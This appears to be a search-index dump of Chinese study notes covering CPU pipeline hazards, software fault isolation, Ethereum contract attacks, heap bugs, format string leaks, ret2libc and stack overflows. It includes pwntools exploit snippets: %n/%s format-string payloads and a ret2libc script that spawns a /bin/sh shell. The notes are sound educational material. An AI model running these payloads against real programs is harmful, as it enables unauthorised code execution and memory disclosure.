η的含义是实际加速比比理论最大加速比，当$n\u0026raquo;m$，即输入数据很多时，有$η \\approx 1$，逼近上确界 流水线冒险\r在前面的演示中，已经看到了流水线中存在运行冲突的现象。事实上实践中可能发生的冲突情况较多，它们被统称为hazard（冒险）\n冒险类型\r数据冒险\r以上的演示都未展示具体的指令内容和访问的对象，并且默认了各条指令间是独立的。但在实践场景中，指令间可能是关联的，这将引发数据冒险。如下： 1 2 add x1, x2, x3 sub x4, x1, x5 可以看到第二条指令用到了第一条指令应在wb阶段写入的数据，流程图如下 可以看到在第一个指令完成WB之前就执行了第二个指令的ID，这会导致第二条指令无法去到正确的x1值。这种错误被称为读后写(RAW - Read After Write) 此外还有一种较为少见的冒险写后读(WAR - Write After Read)。如果我们按照上面的演示思路来思考，会发现似乎是不会出现写后读问题的，这是因为写后读事实上一般出现在乱序执行的处理器中。 1 2 add r1, r2, r3 sub r2, r4, r5 在乱序执行的处理器中，可能有R2的WB在R1的ID前完成的情况，此时指令1读取r2值时读到的是被写入的新值而不是想要写的值。这种错误就是写后读 结构冒险\r除去因为数据处理顺序的原因产生的冒险，如上面提到的，实践中可能存在不同指令的不同阶段访问相同硬件资源的问题，这也会引发冒险，被称为结构冒险 如图，存在两条指令的IF和MEM阶段重叠，同时访问内存，产生冒险 此外，同时访问只有一个写入端口的寄存器也会相似地产生结构冒险 控制/分支冒险\r在上面的例子中，相邻指令都是物理相邻的，即下一条指令的地址即为上一条指令+4，可以在读上一条指令时即确定下一条指令地址。但是如果上一条指令是跳转指令，那么要等到上一条指令执行完，才能解析出下一条指令的地址，这种情况下就可能发生控制/分支冒险 可以看到在还不知道跳转指令的跳转地址时，后续指令已经执行了IF，这里的地址是预测性的，如果预测错误，在后续会被冲掉，这就是控制/分支冒险 解决冒险\r数据冒险\r旁路 原理：当指令的结果在流水线中计算出来后不等待其写回寄存器，而是直接用专门的数据通路（旁路）将结果转发给需要的后续指令 缺点：不能解决所有RAW，特别是当数据来自load指令时，数据在mem阶段菜可用，如果后续指令在mem前就需要，仍然会产生停顿 暂停/气泡 原理：当旁路无法解决冒险时，流水线控制器会插入一个或多个“气泡”（即空操作），强制延迟后续指令知道数据可用 缺点：引入停顿，降低了流水线的CPI（每条指令的时钟周期），从未降低了性能 寄存器重命名 原理：主要用于解决WAR（写后读）和WAW（写后写）这两种“假”数据依赖（或称名称依赖，Name Dependencies）。处理器为逻辑寄存器分配不同的物理寄存器，这样，不同的指令即使操作同一个逻辑寄存器，也可以写入到不同的物理寄存器，从而消除冲突，允许指令乱序执行。 结构冒险\r复制资源 原理：为发生冲突的硬件增加额外的副本。这是最直接和有效的解决方案 示例 内存端口冲突：采用哈弗架构，提供独立的指令内存和数据内存，或者在cpu内部设置独立的指令缓存和数据缓存，从而允许同时访问 功能单元冲突：如果alu是瓶颈，可以增加多个alu，以便不同的指令可以并行使用 寄存器文件端口冲突：增加寄存器文件的读写端口数量，允许在同一周期内进行更多的读写操作 缺点：增加了硬件成本和复杂度 流水线暂停 原理：当发生结构冒险时，暂停其中一条指令，直到所需的资源可用 缺点：引入停顿，降低性能。通常仅作为复制资源的后备方式或在复制资源代价过高时使用 控制冒险\r分支预测 通过复杂的硬件逻辑来预测分支的走向和目标地址 分类： 静态预测：基于编译时的信息和简单的经验法则 动态预测：基于历史行为来预测 延迟分支 原理：在分支指令后紧接着一条或几条分支延迟槽指令 缺点：填充难度较大，在现代高性能处理器较少使用 分支消除/条件执行 原理：对一些简单的条件操作，可以通过硬件支持，将条件分支转换为无需跳转的条件执行指令。 缺点：并非所有复杂的条件分支都能通过这种方式消除 流水线数据通路\r","date":"2025-07-25T20:31:00+08:00","permalink":"https://example.com/p/%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B8%8E%E5%9C%A8%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/","title":"流水线与在处理器中的应用"},{"content":"Software-Based Fault Isolation\r隔离\r隔离方法\r基于硬件的虚拟化 操作系统进程 基于语言的隔离 SFI 性能对比 上下文切换开销 单指令开销 是否需要编译器支持 虚拟机 非常高 无 否 操作系统进程 高 无 否 基于语言的隔离 低 中或无（动态/静态检查） 是 SFI 低 低 可能（二进制重写工具） SFI\rSFI基本介绍\r核心机制 每个保护域（隔离模块）都被分配一个专属内存区域（沙盒） 隔离发生在同一进程的地址空间内 通过在关键指令前插入软件检查实现 SFI沙盒构造 分为三部分 数据区域(DR，Data region): [DB, DL] 保存堆、栈 代码区域(CR, Code region): [DB, DL] 保存代码 安全外部地址(SE, Safe externel) 托管需要更高权限的受信任服务 代码跳转到它们以访问资源 DR,CR和SE不相交 隔离的实现 代码段不可写 数据段不可执行 执法策略 检查每一个危险指令 危险指令: 读/写内存和控制转移指令 动态二进制翻译 在工作时拦截并重写危险指令，插入安全检查代码 内联引用监控 在编译时静态插入安全检查指令 具体执法方式 原始执法方式 在指令前插入检查 存在问题: 运行时开销高 仅完整性隔离 程序执行读远多于写，且在不考虑保密的情况下可以只检查写 数据区域专门化 数据区域地址具有相同的高位，被称作数据区域ID，检查地址是否配置了正确的数据区域ID即可 地址掩码 通过地址掩码将地址在执行前强制改写，使其指向数据段 单指令地址掩码: 缩减到一次指令实现改写地址 Data Guards\r引入伪指令\r数据保护包含地址检查和地址屏蔽 引入伪指令r' = dGuard(r) 该指令满足以下条件 如果r在DR中，r\u0026rsquo; = r 否则 对于地址检查，进入错误状态 对于地址掩码，r\u0026rsquo;获取到一个安全范围内的地址 Guard Zones\r","date":"2025-07-11T22:01:43+08:00","permalink":"https://example.com/p/sfi%E6%8A%80%E6%9C%AF/","title":"SFI技术"},{"content":"Smart Contract\r研究对象————Etheremu\rEtheremu基础知识\r账户\r外部账户(EOA) 外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。 一个外部账户有以下特性： 拥有一定的Ether 可以发送交易，由私钥控制 没有相关联的代码 合约账户 合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。 一个合约账户有以下特性 拥有一定的Ether 有关联代码，代码通过交易或其他合约发来的调用激活 当合约被执行时，只能操作合约账户的特定存储 在Etheremu中，这两种账户统称为“状态对象”，其中外部账户存储以太币余额状态，而合约账户除了余额还有智能合约及其变量的状态。通过交易的执行，这些状态对象发生变化，而 Merkle 树用于索引和验证状态对象的更新。一个以太坊的账户包含 4 个部分 nonce: 已执行交易总量 balance: 帐持币数量 storageRoot: 存储区哈希值 codeHash: 代码区哈希值 两个外部账户之间的交易只是一个价值转移；而外部账户和合约账户之间的交易会激活合约账户的代码，允许进行各种操作 交易\r交易指的是外部账户发送到另一账户的的消息的签名数据包 交易内容 from: 交易发送者地址 to: 交易接收者地址，如果为空代表创建或调用智能合约 value: 转移的以太币数量 data: 数据字段，如果存在，说明是一个创建或调用智能合约的交易 gaslimit: 交易允许消耗的最大gas数量 gasprice: 愿意发送给gas矿工的单价 nonce: 区分同一账户的不容交易的标记 hash: 以上信息生成的散列值 r,s,v: 签名信息 交易类型： 执行转账的交易 创建智能合约的交易 调用智能合约的交易 RPC\rJSON-RPC是一种无状态、轻量级的远程过程调用(RPC)协议。它定义了几种数据结构及处理规则。用于实现软件应用程序与Etheremu区块链的交互 转账\r操作过程： 生成一个交易，使用私钥签名 被签名的交易被广播到P2P网络 矿工将交易包含在一个块中 确认资金转账 燃料(Gas)\r需要设置Gas的原因: 处理停机问题（无限循环） Gas limit: 用户单次交易的gas上限 Gas price: Gas的当前单价，在交易前由用户设置，以Wei为单位 交易费用: Gas*Gas_price Gas消耗： 对于一般交易，消耗为21000 对于智能合约，取决于消耗的资源————执行的命令和使用的存储 EVM\r每个Etheremu节点都包含一个虚拟机，该虚拟机被称为EVM，发挥执行智能合约代码和更改并广播全局状态的作用 特性： 图灵完备性（存在Gas限制） 无浮点数 无系统时钟 核心设计目标: 确定性: 保证相同的输入必定有相同的输出 隔离性: 合约在沙盒环境中运行，不直接访问主机系统 可终止性: 通过Gas限制执行步骤 结构： 基于堆栈 注: 栈式架构特点 所有计算依赖操作数栈 没有通用寄存器 指令隐式操作栈 内存模型： 栈 结构 2字节，最深1024层 易失性 内存 结构 按字寻址的字节数组，可动态扩展 易失性 操作指令 mload(offset): 从内存偏移量处读32字节 mstore(offset,value): 将32字节value写入偏移量offset处 Gas成本: 初始免费，扩容时按每32字节支付Gas 存储 结构 每个合约有独立的持久化键值存储 映射规则: 2^256个键，每个键对应一个32字节的值 特性 持久化: 数据永久写入区块链状态 高Gas成本: 写入消耗成千乃至上万Gas 操作指令 sstore(key,value): 从栈上依次弹出value和key，将value存入存储中key对应的槽位 sload(key): 从栈顶弹出key，将存储中key对应的槽位的数据压入栈 代币合约\rERC-20代币合约\rERC-20是一种通用的智能合约规范，特点是每一个代币都和其他代币完全相等。它是资产通证化的最广泛使用标准 包含API方法和事件 totalSupply: 定义token总供应量 balancdOf: 返回钱包地址包含的token余额 transfer: 从总供应中转移一定数量token并发给用户 transferFrom: 在用户之间传输token approve: 验证是否允许在考虑总供应量的情况下分配一定的token allowance: 检查是否有余额向另一个账户发送token Uniswap\rUniswap是一个完成不同代币间的交易的自动化流动协议 注：自动化流动协议定义 自动化流动性协议是一种利用预定义的数学公式（如恒定乘积公式）和部署在区块链上的智能合约，自动管理用户贡献的资产池（流动性池），并为用户提供无需许可、去中心化、自动定价和执行的代币交换服务的系统。它完全消除了对传统订单簿和专业做市商的依赖，通过算法和社区提供的流动性实现市场功能。 每个（或对）Uniswap智能合约管理着一个由两个ERC-20代币储备组成的流动池 任何人都可以成为池的流动性提供者（LP），即存入基础代币来换取池代币 在池中维持价格：套利 货币对充当市商的角色，根据恒定乘积公式提供替换服务 恒定乘积公式可以简单地表示为$x * y = k$，说明交易不能改变一对储备余额的乘积 $k$通常被称为不变量。这个公式对规模较大的交易的执行速度比小的要慢得多 在实践中Uniswap对交易收取0.30%的费用，这笔费用被存入储备中 ERC-777代币合约\r被ERC-20类似，ERC-777也是一种可替换代币标准，交易时允许更复杂的交互 它的最重要功能是接收hook Etheremu安全漏洞和攻击方式\r重进入攻击\r核心漏洞：“先提款后记账” 具体实现：在提款函数(withdraw)中递归调用，在记录的存款变化前反复提取存款 防御方式： 检查-效果-交互模式: 按照执行检查、改变状态变量、执行与其他合同的交互的顺序运行 使用修饰符锁定（互斥锁）: 即设置一个标识符，当发生与其他合同交互时设置标识符，标识符重置1前无法再进行交互 调用与委托调用攻击\r基本概念：调用与委托调用\r调用: 调用另一个智能合约中的函数 委托调用: 执行来自另一个智能合约的函数，使用调用者的存储和上下文 UUPS(通用可升级代理标准)\r架构: 代理合约拆分\n示意图 代理合约(Proxy) 永久储存所有状态变量 持有逻辑合约地址 通过fallback函数将所有调用用delegatecall转发给逻辑合约 逻辑合约(Logic) 包含实际业务代码 无状态 可被替换（升级） UUPS漏洞: 未初始化\r如果UUPS合同未初始化，那么攻击者可以调用initialize()函数，实现“攻击者成为所有者” 攻击步骤 攻击者成为所有者 部署恶意合约 劫持升级过程 执行恶意代码 ","date":"2025-07-11T22:01:05+08:00","permalink":"https://example.com/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/","title":"智能合约"},{"content":"Heap vulnerabilities\r前置知识：malloc/free\r堆通过malloc/free来管理空间。可能存在如下安全漏洞： 释放后使用（UAF） 双重释放 差一错误 堆的使用规范\r当malloc的指针传递给free后禁止再对该指针进行读写操作 不要在堆分配中使用或泄漏未初始化的信息 不要读取或写入超过堆分配结束的字节 不要重复传递从malloc到free的指针 在分配开始前不要读取或写入字节 不要传递不是由malloc初始化的指针给free 在检查函数是否返回NULL前不要引用malloc指针 堆的内存分配\r内存分配方式\r堆内存是通过从内核调用sbrk系统来分配的 使用mmap来处理大内存分配，这是堆外分配，不在下面的讨论之内 堆相关微观结构\rmalloc_chunk\r我们称malloc申请的内存为chunk，在ptmalloc内部用malloc_chunk结构体表示，定义如下： 1 2 3 4 5 6 7 8 9 10 11 struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* 前一个相邻块的大小（仅当它空闲时有效）。否则被当前块的用户数据覆盖*/ INTERNAL_SIZE_T size; /*存储当前块的总大小（字节数）*/ struct malloc_chunk* fd; /* 前向指针 - 仅空闲时有效 */ struct malloc_chunk* bk; /* 后向指针 - 仅空闲时有效 */ struct malloc_chunk* fd_nextsize; /* 大块专用：指向下一个不同大小的块 */ struct malloc_chunk* bk_nextsize; /* 大块专用：指向上一个不同大小的块 */ } 字段解释： prev_size: 如果该chunk的物理相邻的前一个chunk是空闲的，在这里记录前一个chunk的大小；否则这里记录的是前一个chunk的数据。 size: 该chunk的大小，该大小必须是MALLOC_ ALIGNMENT的整数倍。如果不是，那么会被转换为满足大小的最小的MALLOC_ ALIGNMENT的整数倍，这通过request2size()宏完成。另外该字段的低三位对不记录大小，它们从高到低分别表示： NON_MAIN_ARENA: 记录当前chunk是否不属于主线程，1表示不属于，0表示属于 IS_MAPPED: 记录当前chunk是否是被mmap分配的 PREV_INUSE: 记录前一个chunk块是否被分配。一般来说，队中的第一个被分配的chunk块的size字段的P位都会设置为1，以防止访问前面的非法内存。当一个chunk的size地段的P位为0时，可以通过prev_size字段来获取上一个chunk的大小以及内存地址 fd,bk: chunk处于分配状态时，从fd字段开始是用户的数据。chunk空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd指向下一个（非物理相邻）空闲的chunk bk指向上一个（非物理相邻）空闲的\u0026rsquo;chunk` fd_nextsize， bk_nextsize: 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 chunk结构 栈示意图： * 一个已经分配的 chunk 的样子如上。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。\r当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。\r* 被释放的`chunk`被记录在链表中（可能是循环双向链表，也可能是单向链表）。可以发现如果一个`chunk`处于free状态，会有两个位置记录其相应的大小。即本身的size字段和后面的`chunck`。一般情况下，物理相邻的两个空闲`chunck`会被合并为一个。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲`chunk`块\rbin\rbin的定义\r堆管理器需要跟踪释放的块，以便malloc可以在分配请求期间重用它们 堆管理器维护一系列被称为\u0026quot;bin\u0026quot;的列表来最大限度地提高分配和释放的速度 bin的分类\r共有5种容器：62个小容器，63个大容器，1个未排序容器，10个高速缓存容器，以及每个线程独有的64个线程缓存容器（如果启用） 小容器、大容器以及未排序容易被用于实现堆的基本回收策略，高速缓存容器和线程缓存容器则是实现优化 small bin\rlarge bin\runsorted bin\rfast bin\rtchache bin\r堆相关宏观结构\rArena\r每个arena就是一个独立的堆，独立地管理chunk和bin 对于每个新加入的线程，会试图找到一个没有其他线程正在使用的arena，并且将该arena附加到该线程上。 如果所有arena都被现有的线程使用，那么会创建一个新的arena，注意arena数量存在上限，对于32位架构为2*CPU内核数，对于64位架构为8*CPU内核数。 如果arena数量达到上限，将会出现线程共用aren以及随之而来的线程等待的可能。 堆上漏洞\rUAF(USE-AFTER-FREE)\r错误：在释放了堆上的内存后引用（又名悬垂指针引用） 后果：攻击者可以使用被释放的指针控制数据写入 错误示例： 1 2 3 4 5 6 7 8 9 10 11 12 int main(int argc, char** argv) { char *buf1, *buf2, *buf3; buf1 = (char*)malloc(BUFSIZE1); free(buf1); buf2 = (char*)malloc(BUFSIZE2); buf3 = (char*)malloc(BUFSIZE3); strncpy(buf1, argv[1], BUFSIZE-1); } 在该例子中，当buf1被释放后，该内存就立刻可以重用，之后在为buf2和buf3分配空间时可能分配了该内存。使用被释放的指针进行写操作就可能会覆盖buf2和buf3 利用UAF: 覆盖控制流数据 预防UAF: 将被释放的指针设置为NULL 双重释放(Double Free)\r示例： 1 2 3 4 5 6 7 8 9 int main(int argc, char** argv) { buf1 = (char*)malloc(BUFSIZE1); free(buf1); buf2 = (char*)malloc(BUFSIZE2); strbncpy(buf2, argv[1], BUFSIZE2-1); free(buf1); free(buf2); } 代码工作： 释放buf1，然后分配buf2 buf2可能占用buf1相同的内存空间 buf2获取用户提供的数据 再次释放buf1 其中可能使用一些buf2数据作为元数据 并且可能打乱buf2的元数据 然后是buf2，此时使用了混乱的元数据 双重释放可以达到与堆溢出漏洞类似的效果，可以使用类似的方式预防 空字节溢出(Off- by-Null)\r堆溢出一字节: 将缓冲区改为0 利用方式: 将P从1改写为0 这将导致前一个块被视为空闲 下一个块的释放会将空闲块合并 攻击流程： 分配内存，定位地址 空字节溢出 断链 写入覆盖 ","date":"2025-07-11T22:01:00+08:00","permalink":"https://example.com/p/%E5%A0%86%E6%BC%8F%E6%B4%9E/","title":"堆漏洞"},{"content":"Format string\r前置知识：可变参数函数\r处理可变参数函数的头文件：stdarg.h\r核心组件：\r类型定义va_list 作用：保存可变参数信息的上下文对象（本质是指向参数栈的指针） 用法： 1 va_list args; //声明参数变量列表 宏函数 va_start 作用：初始化va_list，使其指向第一个可变参数 访问参数前必须调用 va_arg 作用：获取当前参数的值（返回值），并且移动至下一个参数 va_end 作用：清理va_list资源 访问结束后必须调用 va_copy(C99新增) 作用：复制va_list的当前状态 用于嵌套访问 示例代码： 实现自定义的printf函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include\u0026lt;stdarg.h\u0026gt; void my_printf(const char* format, ...) { va_lists arg; va_start(arg, format); while(*format) { if(*format == \u0026#39;%\u0026#39;) { format++; switch(*format) { case\u0026#39;d\u0026#39;: { int num = va_arg(arg, int); print_int(num); break; } case\u0026#39;s\u0026#39;: { char* str = vaarg(arg, char*); print_str(str); break; } } } else { putchar(*format); } format++; } va_end(arg); } 实现多加数加法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #incclude\u0026lt;stdarg.h\u0026gt; int add_multiple_values(int argcount, ...) { int counter, res = 0; va_list arg; va_start(arg, argcount); for(counter=0; counter\u0026lt;argcount, counter++) { res += va_arg(arg. int); } va_end(arg); return res; } 格式化字符串漏洞\r核心原理\r格式化输出的栈上分布 示例 代码 1 printf(\u0026#34;Color %s, Number %d, Float %4.2f\u0026#34;, \u0026#34;red\u0026#34;, 123456, 3.14); 栈示意图 泄露内存\r核心思想: printf是依次打印栈上的数据，即可以通过printf(\u0026quot;%x\u0026quot;)直接打印栈上内容 泄露栈内存\r以以下程序为例：\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\u0026#34;%s\u0026#34;, s); printf(\u0026#34;%08x.%08x.%08x.%s\\n\u0026#34;, a, b, c, s); printf(s); return 0; } 编译运行后有\n1 2 3 %08x.%08x.%08x 00000001.22222222.ffffffff.%08x.%08x.%08x ffcfc400.000000c2.f765a6bb 打印出了栈上后续三个字的值\n泄露任意地址内存\r核心思想：利用%s访问的是栈上地址，将想要访问的地址写入栈上特定位置，然后使用%s访问输出 详细操作步骤 Step1:确定偏移量（参数位置） 1 2 payload = b\u0026#34;AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p\u0026#34; io.sendline(payload) 输出示例 1 AAAA.0xffffd09c.0x100.0x80491fe.0xffffd144.0xf7fbe780.0xf7d93374.0x41414141 观察到AAAA的十六进制值0x41414141出现在第7个位置。这个偏移量用于后面指定printf访问的参数位置 Step2:构造地址载荷 1 2 target_addr = 0x804c02c # 要泄露的地址 payload = p32(target_addr) # 打包为小端序 Step3:指定读取位置 1 payload += b\u0026#34;%7$s\u0026#34; #使用步骤1确定的偏移量 Step4:选择读取方式 Step5:发送并解析数据 1 2 3 4 5 6 7 8 9 10 # 发送完整payload payload = p32(target_addr) + b\u0026#34;%7$s\u0026#34; io.sendline(payload) # 接收输出 output = io.recvuntil(b\u0026#34;done\u0026#34;) # 根据程序输出调整 # 解析泄露数据 leak_start = output.find(p32(target_addr)) + 4 # 跳过地址本身 leaked_data = output[leak_start:-10] # 去除尾部\u0026#34;id is...done\u0026#34; Step6:清理输出 1 2 3 4 5 6 7 8 9 10 11 12 # 接收并清理输出 io.recvuntil(b\u0026#34;Address of id is 0x\u0026#34;) # 跳过提示 addr_str = io.recvline().strip() # 获取地址（可选） io.recvuntil(b\u0026#34;you typed: \u0026#34;) # 跳过输入回显 # 接收实际泄露数据 leaked = io.recvuntil(b\u0026#34;\\n\u0026#34;, drop=True) # 处理二进制地址 if leaked.startswith(p32(target_addr)): leaked = leaked[4:] # 移除开头的地址副本 覆盖内存\r核心思想：利用%n 1 %n，将成功输出的字符个数写入对应的整型指针参数所指的变量。 通用操作：构造特定长度的填充，将目标内容，即填充部分长度，写入目标地址。具体操作与泄露类似。 ","date":"2025-07-11T22:00:00+08:00","permalink":"https://example.com/p/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"格式化字符串"},{"content":"Return to libc\rret2libc的意义： 绕过 DEP（Data Execution Prevention）\rCanary\rCannary是一种栈溢出保护机制。是在栈上返回地址前插入一个随机值，该随机值被称为canary。在函数返回前检查canary是否被篡改，如果被篡改，则立刻终止程序 原理：栈溢出时会覆盖返回值下方（低位）的内容，即canary 带canary的栈布局示意图 DEP\r可以发现在Stack overflow中介绍的攻击方式是通过拿shell实现的，因此只要禁止在数据段中执行程序就可以阻止该攻击方式。 DEP就是通过这种方式实现的保护机制 相关知识： 冯诺伊曼架构与哈佛架构 在冯诺伊曼架构中所有代码都是数据，所以可以通过注入数据插入可执行代码 哈佛架构将虚拟地址空间划分为数据区和代码区，代码区是可读（R）和可执行（X）的，数据区域是可读（R）和可写（W）的。任何区域都不能是同时可读，可执行和可写的。 攻破DEP的方式：代码复用攻击\rDEP阻止了我们直接注入代码，但是代码一定要通过外界注入吗？ 可以发现程序和库同样是有函数的，因此我们可以利用其中的函数构建出我们需要的攻击。 理念：重用程序和库中的代码（不需要代码注入） return to libc: 将返回地址替换为危险函数的地址 例： 1 execve(\u0026#34;/bin/sh\u0026#34;); 思路： 找到系统函数的地址 找到字符串\u0026quot;/bin/sh\u0026quot; 将\u0026quot;/bin/sh\u0026quot;传递给系统函数 操作： Step1: 可以使用gdb来查找系统功能地址 Step2: 使用系统环境变量（不稳定） 定义环境变量 示例: 1 2 3 4 5 6 7 8 9 10 11 12 set MYSHELL=“/bin/sh” int main(int argc, char **argv) { printf(\u0026#34;ret2libc start \\n\u0026#34;); char *shell = (char *) getenv(\u0026#34;MYSHELL\u0026#34;); if (shell) { printf(\u0026#34;address %p \\n\u0026#34;, shell); } vul(); printf(\u0026#34;ret2libc end \\n\u0026#34;); return 0; } Step3: 注入： 注入后堆栈展示： 构造注入展示： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * # 获取地址（需提前泄露） system_addr = 0xb7e3dda0 # system()地址 bin_sh_addr = 0xb7f6e5aa # \u0026#34;/bin/sh\u0026#34;地址 exit_addr = 0xb7e369d0 # exit()地址 (可选) # 构造payload offset = 140 # 到返回地址的偏移量 payload = b\u0026#39;A\u0026#39; * offset # 填充缓冲区 payload += p32(system_addr) # 覆盖返回地址 payload += p32(exit_addr) # system()的返回地址 payload += p32(bin_sh_addr) # 参数1: \u0026#34;/bin/sh\u0026#34; # 发送payload io = process(\u0026#39;./vuln_program\u0026#39;) io.sendline(payload) io.interactive() 对上述ret2libc的防护：ASLR\rASLR：\r可以发现，上面的攻击方式中的核心步骤之一是获取系统函数的地址，因此容易想到，如果我们能够阻止获取系统函数地址，就可以实现对上述攻击方式的防护。 ASLR：随机化关键内存基地址 Linux中ASLR分为三级 0：无随机化 1：保留的随机化，共享库、栈、mmp()和VSDO随机化 2：完全的随机化，通过brk()分配的内存空间也会随机化 ","date":"2025-07-11T21:59:45+08:00","permalink":"https://example.com/p/%E8%BF%94%E5%9B%9E%E5%BA%93%E6%96%87%E4%BB%B6/","title":"返回库文件"},{"content":"栈溢出（stack overflow）\r一些术语/概念\r类型安全（Type safety） In computer science, type safety and type soundness are the extent to which a programming language discourages or prevents type errors. ————From wikipidiea 前置知识：x86架构下函数调用中的栈变化\r初始：\n栈示意图： 压入参数（arg1， arg2）\n指令： 1 2 push arg2 push arg1 ;注意，逆序压入参数 栈示意图： 调用函数\n指令 1 2 3 4 call fuc ; 等价于 push eip+5 ;5为call指令的长度 jmp fuc 栈示意图 函数序言（Prologue）\n指令： 1 2 3 push ebp ;保存调用者的EBP mov ebp, esp ;设置当前函数的EBP sub esp, 8 ;为局部变量分配空间（示例中分配8字节） 栈示意图 访问数据\n指令： 1 2 3 mov eax, [ebp+8] ;访问arg1 mov ebx, [ebp+12] ;访问arg2 mov ecx, [ebp-4] ;访问val1 栈示意图 函数尾声\n指令 1 2 3 mov esp, ebp ;释放局部变量 pop ebp ;恢复调用者ebp ret ;返回到调用者 栈示意图(Epilogue) 调用者清理参数\n指令 1 sub esp, 8 栈示意图： 栈溢出\r缓冲区溢出\r当数据写入到分配给特定数据结构的内存边界范围之外时，就会发生缓冲区溢出\n当缓冲区边界被忽略和未检查时会发生\n示例： 1 2 3 4 5 6 7 8 #include\u0026lt;stdio.h\u0026gt; int main() { char a[5]; gets(a); puts(a); printf(\u0026#34;%c\u0026#34;, a[5]); } 直接编译\n1 gcc buffer_overflow1.c 可以看到如下warning\n1 2 3 4 5 6 7 buffer_overflow1.c: In function ‘main’: buffer_overflow1.c:6:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] 6 | gets(a); | ^~~~ | fgets /usr/bin/ld: /tmp/ccA63mQo.o: in function `main\u0026#39;: buffer_overflow1.c:(.text+0x28): warning: the `gets\u0026#39; function is dangerous and should not be used. 这是因为gets(puts)是一个不安全的函数，缺少缓冲区边界检查，即没有对读入字符个数的检查和限制。 现在编译后的可执行文件\n1 ./a.out 输入6个字母abcdef，可以看到如下输出\n1 2 3 4 abcdef abcdef *** stack smashing detected ***: terminated Aborted (core dumped) 可以看到程序被终止，并且给出了*** stack smashing detected ***: terminated，这是由堆栈保护机制（Stack Smashing Protection, SSP）发出的警告信息。当编译器开启了 SSP 选项（例如 GCC 的 -fstack-protector 或 -fstack-protector-all）时，它会在函数栈帧中插入一个被称为“canary”（金丝雀）的随机值。如果缓冲区溢出发生，覆盖了返回地址，那么这个 canary 值也会被改变。在函数返回之前，程序会检查这个 canary 值是否被篡改。如果被篡改，就意味着发生了缓冲区溢出，程序会立即终止执行，并打印这个警告信息。 现在在关闭相关保护机制的情况下编译\n1 gcc -fno-stack-protector -no-pie buffer_overflow1.c 其中的编译选项含义如下：\n-fno-stack-protector: 禁用堆栈保护（stack canary）。这会阻止编译器在缓冲区溢出发生时自动终止程序。 -no-pie: 禁用位置独立可执行文件（Position Independent Executable），使得程序加载到固定的内存地址。这与另一种针对栈溢出的防御地址空间布局随机化（ASLR）有关。 运行后得到如下输出\n1 2 3 abcdef abcdef f 可以看到输入的字符成功覆盖了字符串的后一个字节。即可以利用栈溢出篡改内存中的字节，这是栈溢出攻击的基本原理。\n利用栈溢出的攻击方式————拿shell\r即通过栈溢出注入shellcode来获取目标程序的shell，得到shell后就可以劫持数据流\n","date":"2025-07-11T21:59:00+08:00","permalink":"https://example.com/p/%E6%A0%88%E6%BA%A2%E5%87%BAstack-overflow%E4%B8%8E%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E6%A0%88%E5%8F%98%E5%8C%96/","title":"栈溢出（Stack Overflow）与函数调用中的栈变化"}]